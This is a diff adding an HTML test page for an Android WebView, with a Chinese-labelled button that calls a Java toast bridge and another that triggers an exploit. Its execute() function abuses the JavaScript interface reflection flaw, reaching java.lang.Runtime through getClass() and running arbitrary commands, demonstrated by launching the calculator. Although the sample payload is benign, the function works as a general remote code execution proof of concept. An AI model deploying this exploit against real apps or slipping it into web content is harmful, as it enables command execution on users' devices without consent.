@@ -1,0 +1,48 @@
+<html>
+  <head>
+    <meta http-equiv="Content-Type" content="text/html; charset=gb2312">
+    <script>
+      var i=0;
+      function getContents(inputStream)
+      {
+        var contents = ""+i;
+        var b = inputStream.read();
+        var i = 1;
+        while(b != -1) {
+            var bString = String.fromCharCode(b);
+            contents += bString;
+            contents += "\n"
+            b = inputStream.read();
+        }
+        i=i+1;
+        return contents;
+       }
+      
+       function execute(cmdArgs)
+       {
+        for (var obj in window) {
+            //console.log(obj);
+            if ("getClass" in window[obj]) {
+                //alert(window[obj].getClass());
+                return window[obj].getClass().getClassLoader().loadClass( "java.lang.Runtime" ).
+                    getMethod("getRuntime",null).invoke(null,null).exec(cmdArgs);
+             }
+         }
+       } 
+      
+      //var p = execute(["am", "start", "-n", "com.android.calculator2/com.android.calculator2.Calculator"]);
+    </script>
+
+    <script language="javascript">
+      function showAndroidToast(toast) 
+    {
+        Android.showToast(toast);
+    }
+    </script>
+  </head>
+
+  <body>
+    <button type="button" onclick="showAndroidToast('Hello!!')">与Java代码交互</button>
+    <button type="button" onclick='execute(["am", "start", "-n", "com.android.calculator2/com.android.calculator2.Calculator"])'>弹计算器~~</button>
+  </body>
+</html>
